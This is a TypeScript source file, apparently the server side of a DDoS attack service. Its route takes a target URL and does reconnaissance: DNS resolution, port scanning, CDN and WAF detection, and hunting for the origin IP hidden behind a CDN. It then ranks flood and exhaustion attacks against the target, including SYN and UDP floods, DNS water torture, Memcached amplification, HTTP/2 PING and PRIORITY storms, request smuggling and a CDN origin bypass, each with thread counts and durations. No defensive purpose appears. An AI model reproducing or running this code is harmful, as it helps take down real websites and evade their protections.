  if (isWebServer && isCDN) {
    const cpScore = cdnProvider === "GoCache" ? 87      // GoCache cache layer simpler to poison
      : cdnProvider === "Azion" ? 84
      : cdnProvider === "Varnish" || serverType === "varnish" ? 90  // Varnish = trivial cache bypass
      : cdnProvider === "Fastly" ? 83
      : cdnProvider === "Cloudflare" ? 78               // CF has smart cache normalization
      : 80;
    recs.push({
      method: "cache-poison", name: "CDN Cache Poisoning DoS",
      score: cpScore, tier: tierFromScore(cpScore),
      reason: serverType === "varnish"
        ? `Varnish Cache detected — unique query params (?v=RANDOM) trivially bypass Varnish cache key; 100% origin pass-through guaranteed`
        : cdnProvider === "GoCache"
          ? `GoCache CDN (BR) detected — cache key normalization weaker than Cloudflare; fills edge cache with unique URL variants, forces 100% origin miss rate`
          : `${cdnProvider} detected — fills CDN cache with unique keys, forces 100% origin miss rate, overwhelms origin server behind CDN`,
      suggestedThreads: 100, suggestedDuration: 180, protocol: "HTTP", amplification: 1,
    });
  }

  // ── SYN Flood ──────────────────────────────────────────────────────────
  {
    let score = isIP ? 88 : 70;
    if (isCDN) score = Math.max(score - 15, 42);
    if (serverType === "iis") score = Math.min(score + 5, 92);
    recs.push({
      method: "syn-flood", name: "SYN Flood",
      score, tier: tierFromScore(score),
      reason: isIP
        ? `Direct IP — SYN flood exhausts TCP SYN_RECV backlog before any handshake completes. L4 layer, bypasses all L7 WAF/CDN.`
        : `Domain target — SYN flood effective when resolved to origin IP, bypasses CDN`,
      suggestedThreads: 512, suggestedDuration: 60, protocol: "TCP", amplification: 1,
    });
  }

  // ── UDP Flood ──────────────────────────────────────────────────────────
  {
    let score = isIP ? 82 : 65;
    if (isCDN) score = Math.max(score - 12, 45);
    recs.push({
      method: "udp-flood", name: "UDP Flood",
      score, tier: tierFromScore(score),
      reason: isIP
        ? `Direct IP — UDP flood bypasses connection state, saturates upstream bandwidth and NIC interrupt queues`
        : `Domain resolved — UDP saturates network pipe and forces destination to process all packets`,
      suggestedThreads: 200, suggestedDuration: 60, protocol: "UDP", amplification: 1,
    });
  }

  // ── ICMP Flood ─────────────────────────────────────────────────────────
  {
    let score = isIP ? 80 : 62;
    if (isCDN) score = Math.max(score - 15, 40);
    recs.push({
      method: "icmp-flood", name: "ICMP Flood [3-tier]",
      score, tier: tierFromScore(score),
      reason: `Tier 1: raw socket (CAP_NET_RAW) / Tier 2: hping3 / Tier 3: UDP saturation burst. L3 bandwidth saturation, always works.`,
      suggestedThreads: 1024, suggestedDuration: 60, protocol: "ICMP/L3", amplification: 1,
    });
  }

  // ── DNS Water Torture ──────────────────────────────────────────────────
  if (hasDNS && !isIP) {
    const score = isCDN ? 95 : 78; // CDN: NS servers are UNPROTECTED by CDN — S tier bypass!
    recs.push({
      method: "dns-amp", name: "DNS Water Torture [NS bypass]",
      score, tier: tierFromScore(score),
      reason: isCDN
        ? `${cdnProvider} CDN detected — but NS servers (${opts.hostname}) are NOT behind CDN. DNS Water Torture floods NS servers directly, bypasses ALL CDN/WAF protection completely. Random subdomain queries fill NXDOMAIN cache.`
        : `Floods target NS servers with random subdomain queries — forces recursive resolution, fills NXDOMAIN cache. NS servers are rarely DDoS-protected.`,
      suggestedThreads: 1024, suggestedDuration: 120, protocol: "UDP/DNS", amplification: 1,
    });
  }

  // ── NTP Flood ──────────────────────────────────────────────────────────
  {
    const score = isCDN ? 48 : (isIP ? 85 : 70);
    recs.push({
      method: "ntp-amp", name: "NTP Flood [mode7+mode3]",
      score, tier: tierFromScore(score),
      reason: `Real NTP binary protocol — mode 7 monlist (CVE-2013-5211) + mode 3 client requests to port 123. Direct to target IP.`,
      suggestedThreads: 1024, suggestedDuration: 60, protocol: "UDP/NTP", amplification: 1, simulated: true,
    });
  }

  // ── Memcached UDP Flood ────────────────────────────────────────────────
  {
    const score = isCDN ? 52 : (isIP ? 90 : 75);
    recs.push({
      method: "mem-amp", name: "Memcached UDP [binary proto]",
      score, tier: tierFromScore(score),
      reason: `Real Memcached binary protocol UDP — get+stats to port 11211. Exposed Memcached servers common in hosting environments.`,
      suggestedThreads: 512, suggestedDuration: 30, protocol: "UDP/Memcached", amplification: 51000, simulated: true,
    });
  }

  // ── SSDP M-SEARCH Flood ────────────────────────────────────────────────
  {
    const score = isCDN ? 44 : (isIP ? 72 : 60);
    recs.push({
      method: "ssdp-amp", name: "SSDP M-SEARCH Flood [UPnP]",
      score, tier: tierFromScore(score),
      reason: `Real SSDP protocol to port 1900 — rotates ST targets, random CPFN header, UPnP stack exhaustion on network devices`,
      suggestedThreads: 512, suggestedDuration: 60, protocol: "UDP/SSDP", amplification: 1,
    });
  }

  // ── Slow Read (TCP Buffer Exhaustion) ─────────────────────────────────
  if (httpAvailable || httpsAvailable) {
    const apacheBonus = serverType === "apache" ? 15 : 0;   // Apache holds thread per conn
    const iisBonus    = serverType === "iis"    ? 10 : 0;
    const base        = hasWAF ? 55 : (isIP ? 78 : 65);
    const score       = Math.min(99, base + apacheBonus + iisBonus);
    recs.push({
      method: "slow-read", name: "Slow Read [TCP buffer exhaust]",
      score, tier: tierFromScore(score),
      reason: `Pauses TCP reading after request — fills server send buffer, blocking server thread indefinitely. ${serverType === "apache" ? "Apache thread-per-request model makes this extremely effective." : "Effective against any threaded server."}`,
      suggestedThreads: 500, suggestedDuration: 120, protocol: "TCP/HTTP", amplification: 0,
    });
  }

  // ── HTTP Range Flood (Multi-Range Exhaustion) ──────────────────────────
  if (httpAvailable || httpsAvailable) {
    const nginxBonus = serverType === "nginx" ? 10 : 0;
    const base       = isCDN ? 48 : (isIP ? 72 : 62);
    const score      = Math.min(99, base + nginxBonus);
    recs.push({
      method: "range-flood", name: "HTTP Range Flood [500×1-byte ranges]",
      score, tier: tierFromScore(score),
      reason: "Range: bytes=0-0,...,499-499 forces server to validate all 500 ranges, build multipart response, perform 500× disk seeks per request. Multiplies I/O cost 500×.",
      suggestedThreads: 600, suggestedDuration: 60, protocol: "HTTP", amplification: 0,
    });
  }

  // ── XML Bomb / XXE DoS ─────────────────────────────────────────────────
  if (httpAvailable || httpsAvailable) {
    const base  = isCDN ? 35 : (isIP ? 58 : 48);
    const score = Math.min(99, base);
    recs.push({
      method: "xml-bomb", name: "XML Bomb [billion-laughs XXE]",
      score, tier: tierFromScore(score),
      reason: "Posts billion-laughs XML to SOAP/XMLRPC/XML-REST endpoints. If server parses XML without entity limits, entity expansion causes GB-level memory/CPU exhaustion.",
      suggestedThreads: 80, suggestedDuration: 45, protocol: "HTTP/XML", amplification: 0,
    });
  }

  // ── H2 PING Storm ──────────────────────────────────────────────────────
  if (supportsH2 && httpsAvailable) {
    const h2bonus = serverType === "nginx" ? 12 : (serverType === "apache" ? 10 : 5);
    const base    = isCDN ? 60 : (isIP ? 80 : 72);
    const score   = Math.min(99, base + h2bonus);
    recs.push({
      method: "h2-ping-storm", name: "H2 PING Storm [RFC 7540 §6.7]",
      score, tier: tierFromScore(score),
      reason: "Every HTTP/2 PING frame must be ACK'd by server (mandatory per RFC). Sends 10K PINGs/s per connection — forces context switch + ACK allocation for each. Massive CPU drain.",
      suggestedThreads: 1000, suggestedDuration: 60, protocol: "HTTP/2", amplification: 0,
    });
  }

  // ── HTTP Request Smuggling ─────────────────────────────────────────────
  if (httpAvailable || httpsAvailable) {
    const proxyBonus = isCDN ? 20 : 0; // CDNs as reverse proxies are often vulnerable to desync
    const base       = isIP ? 45 : 62;
    const score      = Math.min(99, base + proxyBonus);
    recs.push({
      method: "http-smuggling", name: "HTTP Smuggling [TE/CL desync]",
      score, tier: tierFromScore(score),
      reason: `TE/CL header desync exploits parsing inconsistencies between reverse proxy and backend. ${isCDN ? `${cdnProvider} as front-end: CL.TE variant poisons backend queue.` : "Can poison backend request queues."}`,
      suggestedThreads: 200, suggestedDuration: 60, protocol: "HTTP", amplification: 0,
    });
  }

  // ── DoH Flood (DNS over HTTPS) ────────────────────────────────────────
  if (httpAvailable || httpsAvailable) {
    const base  = isCDN ? 50 : (isIP ? 40 : 52);
    const score = Math.min(99, base);
    recs.push({
      method: "doh-flood", name: "DoH Flood [/dns-query exhaustion]",
      score, tier: tierFromScore(score),
      reason: "Floods /dns-query with RFC 8484 wire-format DNS queries for random domains. Forces recursive DNS resolution, exhausting resolver thread pool and upstream DNS bandwidth.",
      suggestedThreads: 200, suggestedDuration: 60, protocol: "HTTP/DNS", amplification: 0,
    });
  }

  // ── Keepalive Exhaust ─────────────────────────────────────────────────
  if (httpAvailable || httpsAvailable) {
    const apacheBonus = serverType === "apache" ? 20 : 0; // MaxKeepAliveRequests default=100
    const nodeBonus   = serverType === "nodejs"  ? 15 : 0;
    const nginxBonus  = serverType === "nginx"  ? 10 : 0;
    const base        = hasWAF ? 55 : (isIP ? 75 : 68);
    const score       = Math.min(99, base + apacheBonus + nodeBonus + nginxBonus);
    recs.push({
      method: "keepalive-exhaust", name: "Keepalive Exhaust [128-req pipeline]",
      score, tier: tierFromScore(score),
      reason: `Pipelines 128 requests per keep-alive connection without waiting for responses. Saturates server's keep-alive thread pool. ${serverType === "apache" ? "Apache MaxKeepAliveRequests=100 by default — each connection maxes it out." : "Holds server worker threads until all requests processed."}`,
      suggestedThreads: 500, suggestedDuration: 60, protocol: "HTTP", amplification: 0,
    });
  }

  // ── App Smart Flood ────────────────────────────────────────────────────
  if (isWebServer) {
    let score = isCDN ? 65 : 88;
    if (serverType === "nodejs")   score = Math.min(score + 10, 97);  // event loop single-threaded
    if (serverType === "gunicorn") score = Math.min(score + 8,  96);  // sync workers block on DB
    if (serverType === "tomcat")   score = Math.min(score + 7,  95);  // thread pool per request
    if (serverType === "apache")   score = Math.min(score + 5,  94);  // thread/process model
    if (serverType === "cloudflare") score = Math.max(score - 8, 55); // workers mitigate app attacks
    if (isCDN) score = Math.max(score - 8, 55);
    recs.push({
      method: "app-smart-flood", name: "App Smart Flood [DB query exhaust]",
      score, tier: tierFromScore(score),
      reason: `POSTs randomized data to /login, /search, /checkout, /register — forces uncacheable DB query per request. Exhausts DB connection pool and backend thread pool simultaneously. Cache cannot protect against this vector.`,
      suggestedThreads: 500, suggestedDuration: 90, protocol: "HTTP", amplification: 0,
    });
  }

  // ── Large Header Bomb ──────────────────────────────────────────────────
  if (isWebServer) {
    let score = isCDN ? 60 : 82;
    if (serverType === "nginx")    score = Math.min(score + 10, 93);  // nginx 8KB default limit causes OOM
    if (serverType === "apache")   score = Math.min(score + 8,  91);  // LimitRequestFieldSize
    if (serverType === "iis")      score = Math.min(score + 6,  89);  // IIS MaxRequestBytes
    if (serverType === "nodejs")   score = Math.min(score + 5,  88);  // http.IncomingMessage maxHeaderSize
    if (isCDN) score = Math.max(score - 12, 48);
    recs.push({
      method: "large-header-bomb", name: "Large Header Bomb [16KB header flood]",
      score, tier: tierFromScore(score),
      reason: `Sends 16KB+ of randomized X-* headers per request — forces HTTP parser to allocate a large heap buffer per connection. Bypasses WAFs that only inspect body. ${serverType === "nginx" ? "nginx default max_headers=8KB — forces 400 error allocation storm." : "Server must parse and reject each oversized request, wasting CPU+heap."}`,
      suggestedThreads: 600, suggestedDuration: 90, protocol: "HTTP", amplification: 0,
    });
  }

  // ── H2 PRIORITY Storm ──────────────────────────────────────────────────
  if (supportsH2) {
    let score = isCDN ? 58 : 80;
    if (serverType === "nginx")    score = Math.min(score + 8,  90);
    if (serverType === "apache")   score = Math.min(score + 6,  88);
    if (serverType === "nodejs")   score = Math.min(score + 10, 92); // h2 module sorts per frame
    if (serverType === "cloudflare") score = Math.max(score - 5, 52);
    if (isCDN) score = Math.max(score - 8, 50);
    recs.push({
      method: "http2-priority-storm", name: "H2 PRIORITY Storm [stream dependency exhaust]",
      score, tier: tierFromScore(score),
      reason: `Each HTTP/2 PRIORITY frame (RFC 7540 §6.3) forces server to rebuild its stream dependency tree — no frame limit in spec. Sends 66K+ PRIORITY frames/sec per connection. Pure CPU+heap exhaustion that bypasses all connection-count limits and WAF inspection.`,
      suggestedThreads: 600, suggestedDuration: 90, protocol: "HTTP/2", amplification: 0,
    });
  }

  // ── Origin Bypass — S-tier when real origin IP found behind CDN ──────────
  if (originIP && isCDN) {
    recs.push({
      method: "origin-bypass",
      name: "CDN Origin Bypass [Dual-Front Attack]",
      score: 97,
      tier: "S",
      reason: `Real server IP discovered at ${originIP} (via ${originSource || "DNS enum"}) — bypasses ${cdnProvider || "CDN"} ENTIRELY. Dual-front: (1) http-pipeline+conn-flood+h2-rst-burst+slowloris+ssl-death direct on origin IP = Cloudflare protection irrelevant; (2) cache-poison+waf-bypass on CDN edges forces 100% origin miss rate, amplifying the direct attack. `,
      suggestedThreads: 500,
      suggestedDuration: 180,
      protocol: "HTTP+TLS+TCP",
      amplification: 2,
    });
  } else if (isCDN) {
    // CDN detected but no origin found — recommend best CDN bypass strategy
    recs.push({
      method: "origin-bypass",
      name: "CDN Origin Bypass [Auto-Discovery Mode]",
      score: 78,
      tier: "A",
      reason: `${cdnProvider || "CDN"} detected — origin-bypass will auto-enumerate subdomains (mail, ftp, cpanel, staging, api, direct, etc.), IPv6 AAAA, SPF records, MX records and crt.sh cert history to find real IP. If found: dual-front attack on origin IP + CDN edge. If not found: falls back to bypass-storm + waf-bypass.`,
      suggestedThreads: 400,
      suggestedDuration: 180,
      protocol: "HTTP+TLS+TCP",
      amplification: 1.5,
    });
  }

  // Deduplicate and sort: real methods above simulated at equal score, all returned (no limit)
  return recs.sort((a, b) => {
    if (b.score !== a.score) return b.score - a.score;
    return (a.simulated ? 1 : 0) - (b.simulated ? 1 : 0);
  });
}

// ── Probe a single endpoint ────────────────────────────────────────────────
async function probeHTTP(scheme: string, hostname: string): Promise<{
  ok: boolean; timeMs: number; server: string; headers: Headers | null; body: string;
}> {
  const start = Date.now();
  try {
    const r = await fetch(`${scheme}://${hostname}`, {
      method: "GET",
      signal: AbortSignal.timeout(8000),
      redirect: "follow",
    });
    let body = "";
    try {
      const text = await r.text();
      body = text.slice(0, 2000);
    } catch { /* ignore */ }
    return { ok: true, timeMs: Date.now() - start, server: r.headers.get("server") || "", headers: r.headers, body };
  } catch {
    return { ok: false, timeMs: Date.now() - start, server: "", headers: null, body: "" };
  }
}

// ── Quick GraphQL probe ────────────────────────────────────────────────────
async function probeGraphQL(baseUrl: string): Promise<boolean> {
  const paths = ["/graphql", "/api/graphql", "/gql", "/api/gql", "/v1/graphql"];
  const results = await Promise.all(paths.map(async p => {
    try {
      const r = await fetch(`${baseUrl}${p}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ query: "{ __typename }" }),
        signal: AbortSignal.timeout(4000),
      });
      const ct = r.headers.get("content-type") || "";
      if (ct.includes("json") || r.status === 200 || r.status === 400) return true;
      return false;
    } catch { return false; }
  }));
  return results.some(Boolean);
}

// ── WebSocket upgrade probe ────────────────────────────────────────────────
function detectWebSocketSupport(headers: Headers): boolean {
  const upgrade = (headers.get("upgrade") || "").toLowerCase();
  const allow   = (headers.get("allow") || "").toLowerCase();
  return upgrade.includes("websocket") || allow.includes("websocket");
}

router.post("/analyze", async (req, res): Promise<void> => {
  const parsed = AnalyzeTargetBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: parsed.error.message });
    return;
  }

  let { url } = parsed.data;
  if (!url.trim()) { res.status(400).json({ error: "URL required" }); return; }

  let hostname = url.trim();
  let originalScheme = "http";
  try {
    const u = new URL(hostname.startsWith("http") ? hostname : `http://${hostname}`);
    hostname = u.hostname;
    originalScheme = u.protocol.replace(":", "");
  } catch { /* keep as-is */ }

  const isIPv4 = /^\d{1,3}(\.\d{1,3}){3}$/.test(hostname);

  // DNS resolution
  let resolvedIp: string | null = null;
  let hasDNS = false;
  let allIPs: string[] = [];
  if (!isIPv4) {
    try {
      const addrs = await dns.resolve4(hostname);
      resolvedIp = addrs[0] ?? null;
      allIPs = addrs;
      hasDNS = true;
    } catch { /* no DNS */ }
  }

  const ip = isIPv4 ? hostname : resolvedIp;

  // Parallel port scan + HTTP probes
  const commonPorts = [80, 443, 8080, 8443, 3000, 8888, 9000];
  const [portScanResult, httpResult, httpsResult] = await Promise.all([
    ip ? scanPorts(ip, commonPorts) : Promise.resolve([] as number[]),
    probeHTTP("http",  hostname),
    probeHTTP("https", hostname),
  ]);

  let httpAvailable  = false;
  let httpsAvailable = false;
  let responseTimeMs = 0;
  let serverHeader   = "";
  let isCDN          = false;
  let cdnProvider    = "";
  let hasWAF         = false;
  let wafProvider    = "";
  let supportsH2     = false;
  let supportsH3     = false;
  let altSvc         = "";
  let hasHSTS        = false;
  let hstsMaxAge     = 0;
  let capturedHeaders: Headers | null = null;
  let capturedBody   = "";

  if (httpResult.ok) {
    httpAvailable = true;
    responseTimeMs = httpResult.timeMs;
    serverHeader = httpResult.server;
    capturedHeaders = httpResult.headers;
    capturedBody = httpResult.body;
    if (httpResult.headers) {
      const cdn = detectCDN(httpResult.headers);
      isCDN = cdn.isCDN; cdnProvider = cdn.provider;
      const h = detectHTTPVersions(httpResult.headers);
      supportsH2 = h.supportsH2; supportsH3 = h.supportsH3; altSvc = h.altSvc;
      const hsts = detectHSTS(httpResult.headers);
      hasHSTS = hsts.hasHSTS; hstsMaxAge = hsts.maxAge;
    }
  }

  if (httpsResult.ok) {
    httpsAvailable = true;
    if (!httpAvailable) {
      responseTimeMs = httpsResult.timeMs;
      serverHeader = httpsResult.server;
      capturedHeaders = httpsResult.headers;
      capturedBody = httpsResult.body;
      if (httpsResult.headers) {
        const cdn = detectCDN(httpsResult.headers);
        isCDN = cdn.isCDN; cdnProvider = cdn.provider;
        const h = detectHTTPVersions(httpsResult.headers);
        supportsH2 = h.supportsH2; supportsH3 = h.supportsH3; altSvc = h.altSvc;
        const hsts = detectHSTS(httpsResult.headers);
        hasHSTS = hsts.hasHSTS; hstsMaxAge = hsts.maxAge;
      }
    } else if (httpsResult.headers) {
      // Merge CDN/WAF from HTTPS too
      if (!isCDN) {
        const cdn = detectCDN(httpsResult.headers);
        if (cdn.isCDN) { isCDN = true; cdnProvider = cdn.provider; }
      }
      if (!supportsH2) {
        const h = detectHTTPVersions(httpsResult.headers);
        supportsH2 = h.supportsH2; supportsH3 = h.supportsH3; altSvc = altSvc || h.altSvc;
      }
    }
  }

  // WAF detection from headers + body
  if (capturedHeaders) {
    const waf = detectWAF(capturedHeaders, capturedBody);
    hasWAF = waf.hasWAF; wafProvider = waf.wafProvider;
  }

  // WebSocket support
  const hasWebSocket = capturedHeaders ? detectWebSocketSupport(capturedHeaders) : false;

  // Build open ports: confirmed HTTP probe ports + TCP scan
  const openPorts: number[] = [];
  if (httpAvailable)  openPorts.push(80);
  if (httpsAvailable) openPorts.push(443);
  if (hasDNS) openPorts.push(53);
  for (const p of portScanResult) {
    if (!openPorts.includes(p)) openPorts.push(p);
  }
  openPorts.sort((a, b) => a - b);

  // ── Origin IP Discovery — comprehensive multi-technique finder ──────────
  // Techniques: subdomain enum, IPv6 AAAA, SPF/TXT, MX, crt.sh SSL history
  let originIP: string | null        = null;
  let originSubdomain: string | null = null;
  let originSource: string           = "";
  let originConfidence: string       = "";
  if (isCDN && !isIPv4 && hasDNS) {
    const CDN_BYPASS_SUBS = [
      "direct", "mail", "smtp", "ftp", "cpanel", "whm", "webmail",
      "www2", "origin", "backend", "server", "api", "app", "cdn-origin",
      "real", "direct-connect", "o1", "admin", "staging",
    ];
    // Resolve all subdomains concurrently
    const subResults = await Promise.all(
      CDN_BYPASS_SUBS.map(async (sub) => {
        try {
          const fqdn = `${sub}.${hostname}`;
          const ips  = await dns.resolve4(fqdn);
          return { sub, fqdn, ips };
        } catch { return null; }
      })
    );
    // Find a subdomain that resolves to a different IP than the CDN
    for (const r of subResults) {
      if (!r) continue;
      const subIp = r.ips[0];
      if (subIp && !allIPs.includes(subIp)) {
        // Verify it responds on port 80/443 (real origin, not another CDN)
        const isOpen = await new Promise<boolean>((res) => {
          const s = net.createConnection({ host: subIp, port: 443 });
          s.setTimeout(1500);
          s.once("connect",  () => { s.destroy(); res(true);  });
          s.once("timeout",  () => { s.destroy(); res(false); });
          s.once("error",    () => { s.destroy(); // Try port 80
            const s2 = net.createConnection({ host: subIp, port: 80 });
            s2.setTimeout(1000);
            s2.once("connect", () => { s2.destroy(); res(true); });
            s2.once("timeout", () => { s2.destroy(); res(false); });
            s2.once("error",   () => { s2.destroy(); res(false); });
          });
        });
        if (isOpen) { originIP = subIp; originSubdomain = r.fqdn; originSource = `subdomain:${r.fqdn}`; originConfidence = "high"; break; }
      }
    }
    // Strategy 2: parse SPF record for "ip4:" hints
    if (!originIP) {
      try {
        const txts = await dns.resolveTxt(hostname);
        for (const parts of txts) {
          const spf = parts.join(" ");
          if (!spf.startsWith("v=spf1")) continue;
          const m = spf.match(/ip4:([\d.]+)/g);
          if (m) {
            for (const entry of m) {
              const candidate = entry.slice(4).split("/")[0]; // strip CIDR
              if (candidate && !allIPs.includes(candidate)) {
                originIP = candidate;
                originSource = "SPF TXT record";
                originConfidence = "medium";
                break;
              }
            }
          }
          if (originIP) break;
        }
      } catch { /* no SPF */ }
    }

    // Strategy 3-5: full multi-technique finder (IPv6, MX, crt.sh)
    if (!originIP) {
      const found = await findOriginIP(hostname, allIPs).catch(() => ({ originIP: null, source: "", confidence: "low" as const }));
      if (found.originIP) {
        originIP = found.originIP;
        originSource = found.source;
        originConfidence = found.confidence;
      }
    }
  }

  // GraphQL probe (fire & forget, quick timeout)
  const baseUrl = httpsAvailable ? `https://${hostname}` : `http://${hostname}`;
  const hasGraphQL = (httpAvailable || httpsAvailable)
    ? await probeGraphQL(baseUrl).catch(() => false)
    : false;

  const serverType  = detectServerType(serverHeader, capturedHeaders);
  const serverLabel = SERVER_LABELS[serverType];

  const recommendations = scoreMethodsFor({
    isIP: isIPv4,
    httpAvailable,
    httpsAvailable,
    responseTimeMs,
    serverHeader,
    serverType,
    isCDN,
    cdnProvider,
    hasWAF,
    wafProvider,
    hasDNS,
    supportsH2,
    supportsH3,
    openPorts,
    hasGraphQL,
    hasWebSocket,
    hostname,
    originIP,
    originSource,
  });

  res.json({
    target:            hostname,
    ip,
    allIPs,
    isIP:              isIPv4,
    hasDNS,
    httpAvailable,
    httpsAvailable,
    responseTimeMs,
    serverHeader,
    serverType,
    serverLabel,
    isCDN,
    cdnProvider,
    hasWAF,
    wafProvider,
    supportsH2,
    supportsH3,
    altSvc,
    hasHSTS,
    hstsMaxAge,
    hasGraphQL,
    hasWebSocket,
    openPorts,
    originIP,
    originSubdomain,
    originSource:      originSource  || null,
    originConfidence:  originConfidence || null,
    recommendations,
  });
});

export default router;
